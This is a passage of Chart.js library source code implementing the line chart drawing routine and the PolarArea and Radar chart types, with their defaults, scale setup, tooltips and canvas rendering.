					fillColor : this.datasets[datasetIndex].pointColor
				}));
			},this);

			this.scale.addXLabel(label);
			//Then re-render the chart.
			this.update();
		},
		removeData : function(){
			this.scale.removeXLabel();
			//Then re-render the chart.
			helpers.each(this.datasets,function(dataset){
				dataset.points.shift();
			},this);
			this.update();
		},
		reflow : function(){
			var newScaleProps = helpers.extend({
				height : this.chart.height,
				width : this.chart.width
			});
			this.scale.update(newScaleProps);
		},
		draw : function(ease){
			var easingDecimal = ease || 1;
			this.clear();

			var ctx = this.chart.ctx;

			// Some helper methods for getting the next/prev points
			var hasValue = function(item){
				return item.value !== null;
			},
			nextPoint = function(point, collection, index){
				return helpers.findNextWhere(collection, hasValue, index) || point;
			},
			previousPoint = function(point, collection, index){
				return helpers.findPreviousWhere(collection, hasValue, index) || point;
			};

			this.scale.draw(easingDecimal);


			helpers.each(this.datasets,function(dataset){
				var pointsWithValues = helpers.where(dataset.points, hasValue);

				//Transition each point first so that the line and point drawing isn't out of sync
				//We can use this extra loop to calculate the control points of this dataset also in this loop

				helpers.each(dataset.points, function(point, index){
					if (point.hasValue()){
						point.transition({
							y : this.scale.calculateY(point.value),
							x : this.scale.calculateX(index)
						}, easingDecimal);
					}
				},this);


				// Control points need to be calculated in a seperate loop, because we need to know the current x/y of the point
				// This would cause issues when there is no animation, because the y of the next point would be 0, so beziers would be skewed
				if (this.options.bezierCurve){
					helpers.each(pointsWithValues, function(point, index){
						var tension = (index > 0 && index < pointsWithValues.length - 1) ? this.options.bezierCurveTension : 0;
						point.controlPoints = helpers.splineCurve(
							previousPoint(point, pointsWithValues, index),
							point,
							nextPoint(point, pointsWithValues, index),
							tension
						);

						// Prevent the bezier going outside of the bounds of the graph

						// Cap puter bezier handles to the upper/lower scale bounds
						if (point.controlPoints.outer.y > this.scale.endPoint){
							point.controlPoints.outer.y = this.scale.endPoint;
						}
						else if (point.controlPoints.outer.y < this.scale.startPoint){
							point.controlPoints.outer.y = this.scale.startPoint;
						}

						// Cap inner bezier handles to the upper/lower scale bounds
						if (point.controlPoints.inner.y > this.scale.endPoint){
							point.controlPoints.inner.y = this.scale.endPoint;
						}
						else if (point.controlPoints.inner.y < this.scale.startPoint){
							point.controlPoints.inner.y = this.scale.startPoint;
						}
					},this);
				}


				//Draw the line between all the points
				ctx.lineWidth = this.options.datasetStrokeWidth;
				ctx.strokeStyle = dataset.strokeColor;
				ctx.beginPath();

				helpers.each(pointsWithValues, function(point, index){
					if (index === 0){
						ctx.moveTo(point.x, point.y);
					}
					else{
						if(this.options.bezierCurve){
							var previous = previousPoint(point, pointsWithValues, index);

							ctx.bezierCurveTo(
								previous.controlPoints.outer.x,
								previous.controlPoints.outer.y,
								point.controlPoints.inner.x,
								point.controlPoints.inner.y,
								point.x,
								point.y
							);
						}
						else{
							ctx.lineTo(point.x,point.y);
						}
					}
				}, this);

				ctx.stroke();

				if (this.options.datasetFill && pointsWithValues.length > 0){
					//Round off the line by going to the base of the chart, back to the start, then fill.
					ctx.lineTo(pointsWithValues[pointsWithValues.length - 1].x, this.scale.endPoint);
					ctx.lineTo(pointsWithValues[0].x, this.scale.endPoint);
					ctx.fillStyle = dataset.fillColor;
					ctx.closePath();
					ctx.fill();
				}

				//Now draw the points over the line
				//A little inefficient double looping, but better than the line
				//lagging behind the point positions
				helpers.each(pointsWithValues,function(point){
					point.draw();
				});
			},this);
		}
	});


}).call(this);

(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		//Cache a local reference to Chart.helpers
		helpers = Chart.helpers;

	var defaultConfig = {
		//Boolean - Show a backdrop to the scale label
		scaleShowLabelBackdrop : true,

		//String - The colour of the label backdrop
		scaleBackdropColor : "rgba(255,255,255,0.75)",

		// Boolean - Whether the scale should begin at zero
		scaleBeginAtZero : true,

		//Number - The backdrop padding above & below the label in pixels
		scaleBackdropPaddingY : 2,

		//Number - The backdrop padding to the side of the label in pixels
		scaleBackdropPaddingX : 2,

		//Boolean - Show line for each value in the scale
		scaleShowLine : true,

		//Boolean - Stroke a line around each segment in the chart
		segmentShowStroke : true,

		//String - The colour of the stroke on each segement.
		segmentStrokeColor : "#fff",

		//Number - The width of the stroke value in pixels
		segmentStrokeWidth : 2,

		//Number - Amount of animation steps
		animationSteps : 100,

		//String - Animation easing effect.
		animationEasing : "easeOutBounce",

		//Boolean - Whether to animate the rotation of the chart
		animateRotate : true,

		//Boolean - Whether to animate scaling the chart from the centre
		animateScale : false,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<segments.length; i++){%><li><span style=\"background-color:<%=segments[i].fillColor%>\"></span><%if(segments[i].label){%><%=segments[i].label%><%}%></li><%}%></ul>"
	};


	Chart.Type.extend({
		//Passing in a name registers this chart in the Chart namespace
		name: "PolarArea",
		//Providing a defaults will also register the deafults in the chart namespace
		defaults : defaultConfig,
		//Initialize is fired when the chart is initialized - Data is passed in as a parameter
		//Config is automatically merged by the core of Chart.js, and is available at this.options
		initialize:  function(data){
			this.segments = [];
			//Declare segment class as a chart instance specific class, so it can share props for this instance
			this.SegmentArc = Chart.Arc.extend({
				showStroke : this.options.segmentShowStroke,
				strokeWidth : this.options.segmentStrokeWidth,
				strokeColor : this.options.segmentStrokeColor,
				ctx : this.chart.ctx,
				innerRadius : 0,
				x : this.chart.width/2,
				y : this.chart.height/2
			});
			this.scale = new Chart.RadialScale({
				display: this.options.showScale,
				fontStyle: this.options.scaleFontStyle,
				fontSize: this.options.scaleFontSize,
				fontFamily: this.options.scaleFontFamily,
				fontColor: this.options.scaleFontColor,
				showLabels: this.options.scaleShowLabels,
				showLabelBackdrop: this.options.scaleShowLabelBackdrop,
				backdropColor: this.options.scaleBackdropColor,
				backdropPaddingY : this.options.scaleBackdropPaddingY,
				backdropPaddingX: this.options.scaleBackdropPaddingX,
				lineWidth: (this.options.scaleShowLine) ? this.options.scaleLineWidth : 0,
				lineColor: this.options.scaleLineColor,
				lineArc: true,
				width: this.chart.width,
				height: this.chart.height,
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2,
				ctx : this.chart.ctx,
				templateString: this.options.scaleLabel,
				valuesCount: data.length
			});

			this.updateScaleRange(data);

			this.scale.update();

			helpers.each(data,function(segment,index){
				this.addData(segment,index,true);
			},this);

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activeSegments = (evt.type !== 'mouseout') ? this.getSegmentsAtEvent(evt) : [];
					helpers.each(this.segments,function(segment){
						segment.restore(["fillColor"]);
					});
					helpers.each(activeSegments,function(activeSegment){
						activeSegment.fillColor = activeSegment.highlightColor;
					});
					this.showTooltip(activeSegments);
				});
			}

			this.render();
		},
		getSegmentsAtEvent : function(e){
			var segmentsArray = [];

			var location = helpers.getRelativePosition(e);

			helpers.each(this.segments,function(segment){
				if (segment.inRange(location.x,location.y)) segmentsArray.push(segment);
			},this);
			return segmentsArray;
		},
		addData : function(segment, atIndex, silent){
			var index = atIndex || this.segments.length;

			this.segments.splice(index, 0, new this.SegmentArc({
				fillColor: segment.color,
				highlightColor: segment.highlight || segment.color,
				label: segment.label,
				value: segment.value,
				outerRadius: (this.options.animateScale) ? 0 : this.scale.calculateCenterOffset(segment.value),
				circumference: (this.options.animateRotate) ? 0 : this.scale.getCircumference(),
				startAngle: Math.PI * 1.5
			}));
			if (!silent){
				this.reflow();
				this.update();
			}
		},
		removeData: function(atIndex){
			var indexToDelete = (helpers.isNumber(atIndex)) ? atIndex : this.segments.length-1;
			this.segments.splice(indexToDelete, 1);
			this.reflow();
			this.update();
		},
		calculateTotal: function(data){
			this.total = 0;
			helpers.each(data,function(segment){
				this.total += segment.value;
			},this);
			this.scale.valuesCount = this.segments.length;
		},
		updateScaleRange: function(datapoints){
			var valuesArray = [];
			helpers.each(datapoints,function(segment){
				valuesArray.push(segment.value);
			});

			var scaleSizes = (this.options.scaleOverride) ?
				{
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				} :
				helpers.calculateScaleRange(
					valuesArray,
					helpers.min([this.chart.width, this.chart.height])/2,
					this.options.scaleFontSize,
					this.options.scaleBeginAtZero,
					this.options.scaleIntegersOnly
				);

			helpers.extend(
				this.scale,
				scaleSizes,
				{
					size: helpers.min([this.chart.width, this.chart.height]),
					xCenter: this.chart.width/2,
					yCenter: this.chart.height/2
				}
			);

		},
		update : function(){
			this.calculateTotal(this.segments);

			helpers.each(this.segments,function(segment){
				segment.save();
			});
			
			this.reflow();
			this.render();
		},
		reflow : function(){
			helpers.extend(this.SegmentArc.prototype,{
				x : this.chart.width/2,
				y : this.chart.height/2
			});
			this.updateScaleRange(this.segments);
			this.scale.update();

			helpers.extend(this.scale,{
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2
			});

			helpers.each(this.segments, function(segment){
				segment.update({
					outerRadius : this.scale.calculateCenterOffset(segment.value)
				});
			}, this);

		},
		draw : function(ease){
			var easingDecimal = ease || 1;
			//Clear & draw the canvas
			this.clear();
			helpers.each(this.segments,function(segment, index){
				segment.transition({
					circumference : this.scale.getCircumference(),
					outerRadius : this.scale.calculateCenterOffset(segment.value)
				},easingDecimal);

				segment.endAngle = segment.startAngle + segment.circumference;

				// If we've removed the first segment we need to set the first one to
				// start at the top.
				if (index === 0){
					segment.startAngle = Math.PI * 1.5;
				}

				//Check to see if it's the last segment, if not get the next and update the start angle
				if (index < this.segments.length - 1){
					this.segments[index+1].startAngle = segment.endAngle;
				}
				segment.draw();
			}, this);
			this.scale.draw();
		}
	});

}).call(this);
(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		helpers = Chart.helpers;



	Chart.Type.extend({
		name: "Radar",
		defaults:{
			//Boolean - Whether to show lines for each scale point
			scaleShowLine : true,

			//Boolean - Whether we show the angle lines out of the radar
			angleShowLineOut : true,

			//Boolean - Whether to show labels on the scale
			scaleShowLabels : false,

			// Boolean - Whether the scale should begin at zero
			scaleBeginAtZero : true,

			//String - Colour of the angle line
			angleLineColor : "rgba(0,0,0,.1)",

			//Number - Pixel width of the angle line
			angleLineWidth : 1,

			//String - Point label font declaration
			pointLabelFontFamily : "'Arial'",

			//String - Point label font weight
			pointLabelFontStyle : "normal",

			//Number - Point label font size in pixels
			pointLabelFontSize : 10,

			//String - Point label font colour
			pointLabelFontColor : "#666",

			//Boolean - Whether to show a dot for each point
			pointDot : true,

			//Number - Radius of each point dot in pixels
			pointDotRadius : 3,

			//Number - Pixel width of point dot stroke
			pointDotStrokeWidth : 1,

			//Number - amount extra to add to the radius to cater for hit detection outside the drawn point
			pointHitDetectionRadius : 20,

			//Boolean - Whether to show a stroke for datasets
			datasetStroke : true,

			//Number - Pixel width of dataset stroke
			datasetStrokeWidth : 2,

			//Boolean - Whether to fill the dataset with a colour
			datasetFill : true,

			//String - A legend template
			legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>"

		},

		initialize: function(data){
			this.PointClass = Chart.Point.extend({
				strokeWidth : this.options.pointDotStrokeWidth,
				radius : this.options.pointDotRadius,
				display: this.options.pointDot,
				hitDetectionRadius : this.options.pointHitDetectionRadius,
				ctx : this.chart.ctx
			});

			this.datasets = [];

			this.buildScale(data);

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activePointsCollection = (evt.type !== 'mouseout') ? this.getPointsAtEvent(evt) : [];

					this.eachPoints(function(point){
						point.restore(['fillColor', 'strokeColor']);
					});
					helpers.each(activePointsCollection, function(activePoint){
						activePoint.fillColor = activePoint.highlightFill;
						activePoint.strokeColor = activePoint.highlightStroke;
					});

					this.showTooltip(activePointsCollection);
				});
			}

			//Iterate through each of the datasets, and build this into a property of the chart
			helpers.each(data.datasets,function(dataset){

				var datasetObject = {
					label: dataset.label || null,
					fillColor : dataset.fillColor,
					strokeColor : dataset.strokeColor,
					pointColor : dataset.pointColor,
					pointStrokeColor : dataset.pointStrokeColor,
					points : []
				};

				this.datasets.push(datasetObject);

				helpers.each(dataset.data,function(dataPoint,index){
					//Add a new point for each piece of data, passing any required data to draw.
					var pointPosition;
					if (!this.scale.animation){
						pointPosition = this.scale.getPointPosition(index, this.scale.calculateCenterOffset(dataPoint));
					}
					datasetObject.points.push(new this.PointClass({
						value : dataPoint,
						label : data.labels[index],
						datasetLabel: dataset.label,
						x: (this.options.animation) ? this.scale.xCenter : pointPosition.x,
						y: (this.options.animation) ? this.scale.yCenter : pointPosition.y,
						strokeColor : dataset.pointStrokeColor,
						fillColor : dataset.pointColor,
						highlightFill : dataset.pointHighlightFill || dataset.pointColor,
						highlightStroke : dataset.pointHighlightStroke || dataset.pointStrokeColor
					}));
				},this);

			},this);

			this.render();
		},
		eachPoints : function(callback){
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,callback,this);
			},this);
		},

		getPointsAtEvent : function(evt){
			var mousePosition = helpers.getRelativePosition(evt),
				fromCenter = helpers.getAngleFromPoint({
					x: this.scale.xCenter,
					y: this.scale.yCenter
				}, mousePosition);

			var anglePerIndex = (Math.PI * 2) /this.scale.valuesCount,
				pointIndex = Math.round((fromCenter.angle - Math.PI * 1.5) / anglePerIndex),
				activePointsCollection = [];

			// If we're at the top, make the pointIndex 0 to get the first of the array.
			if (pointIndex >= this.scale.valuesCount || pointIndex < 0){
				pointIndex = 0;
			}

			if (fromCenter.distance <= this.scale.drawingArea){
				helpers.each(this.datasets, function(dataset){
					activePointsCollection.push(dataset.points[pointIndex]);
				});
			}

			return activePointsCollection;
		},

		buildScale : function(data){
			this.scale = new Chart.RadialScale({
				display: this.options.showScale,
				fontStyle: this.options.scaleFontStyle,
				fontSize: this.options.scaleFontSize,
				fontFamily: this.options.scaleFontFamily,
				fontColor: this.options.scaleFontColor,
				showLabels: this.options.scaleShowLabels,
				showLabelBackdrop: this.options.scaleShowLabelBackdrop,
				backdropColor: this.options.scaleBackdropColor,
				backdropPaddingY : this.options.scaleBackdropPaddingY,
				backdropPaddingX: this.options.scaleBackdropPaddingX,
				lineWidth: (this.options.scaleShowLine) ? this.options.scaleLineWidth : 0,
				lineColor: this.options.scaleLineColor,
				angleLineColor : this.options.angleLineColor,
				angleLineWidth : (this.options.angleShowLineOut) ? this.options.angleLineWidth : 0,
				// Point labels at the edge of each line
				pointLabelFontColor : this.options.pointLabelFontColor,
				pointLabelFontSize : this.options.pointLabelFontSize,
				pointLabelFontFamily : this.options.pointLabelFontFamily,
				pointLabelFontStyle : this.options.pointLabelFontStyle,
				height : this.chart.height,
				width: this.chart.width,
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2,
				ctx : this.chart.ctx,
				templateString: this.options.scaleLabel,
				labels: data.labels,
				valuesCount: data.datasets[0].data.length
			});

			this.scale.setScaleSize();
			this.updateScaleRange(data.datasets);
			this.scale.buildYLabels();
		},
		updateScaleRange: function(datasets){
			var valuesArray = (function(){
				var totalDataArray = [];
				helpers.each(datasets,function(dataset){
					if (dataset.data){
						totalDataArray = totalDataArray.concat(dataset.data);
					}
					else {
						helpers.each(dataset.points, function(point){
							totalDataArray.push(point.value);
						});
					}
				});
				return totalDataArray;
			})();


			var scaleSizes = (this.options.scaleOverride) ?
				{
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				} :
				helpers.calculateScaleRange(
					valuesArray,
					helpers.min([this.chart.width, this.chart.height])/2,
					this.options.scaleFontSize,
					this.options.scaleBeginAtZero,
					this.options.scaleIntegersOnly
				);

			helpers.extend(
				this.scale,
				scaleSizes
			);

		},
		addData : function(valuesArray,label){
			//Map the values array for each of the datasets
			this.scale.valuesCount++;
			helpers.each(valuesArray,function(value,datasetIndex){
				var pointPosition = this.scale.getPointPosition(this.scale.valuesCount, this.scale.calculateCenterOffset(value));
				this.datasets[datasetIndex].points.push(new this.PointClass({
					value : value,
					label : label,
					x: pointPosition.x,
					y: pointPosition.y,
					strokeColor : this.datasets[datasetIndex].pointStrokeColor,
					fillColor : this.datasets[datasetIndex].pointColor
				}));
			},this);

			this.scale.labels.push(label);

			this.reflow();

			this.update();
		},
		removeData : function(){
			this.scale.valuesCount--;
			this.scale.labels.shift();
			helpers.each(this.datasets,function(dataset){
				dataset.points.shift();
			},this);
			this.reflow();
			this.update();
		},
		update : function(){
			this.eachPoints(function(point){
				point.save();
			});
			this.reflow();
			this.render();
		},
		reflow: function(){
			helpers.extend(this.scale, {
				width : this.chart.width,
				height: this.chart.height,
				size : helpers.min([this.chart.width, this.chart.height]),
				xCenter: this.chart.width/2,
				yCenter: this.chart.height/2
			});
			this.updateScaleRange(this.datasets);
			this.scale.setScaleSize();
			this.scale.buildYLabels();
		},
		draw : function(ease){
			var easeDecimal = ease || 1,
				ctx = this.chart.ctx;
			this.clear();
			this.scale.draw();

			helpers.each(this.datasets,function(dataset){

				//Transition each point first so that the line and point drawing isn't out of sync
				helpers.each(dataset.points,function(point,index){
					if (point.hasValue()){
						point.transition(this.scale.getPointPosition(index, this.scale.calculateCenterOffset(point.value)), easeDecimal);
					}
				},this);



				//Draw the line between all the points
				ctx.lineWidth = this.options.datasetStrokeWidth;
				ctx.strokeStyle = dataset.strokeColor;
				ctx.beginPath();
				helpers.each(dataset.points,function(point,index){
					if (index === 0){
						ctx.moveTo(point.x,point.y);
					}
					else{
						ctx.lineTo(point.x,point.y);
					}
				},this);
				ctx.closePath();
				ctx.stroke();

				ctx.fillStyle = dataset.fillColor;
				ctx.fill();

				//Now draw the points over the line
				//A little inefficient double looping, but better than the line
				//lagging behind the point positions
				helpers.each(dataset.points,function(point){
					if (point.hasValue()){
						point.draw();
					}
				});

			},this);

		}

	});





}).call(this);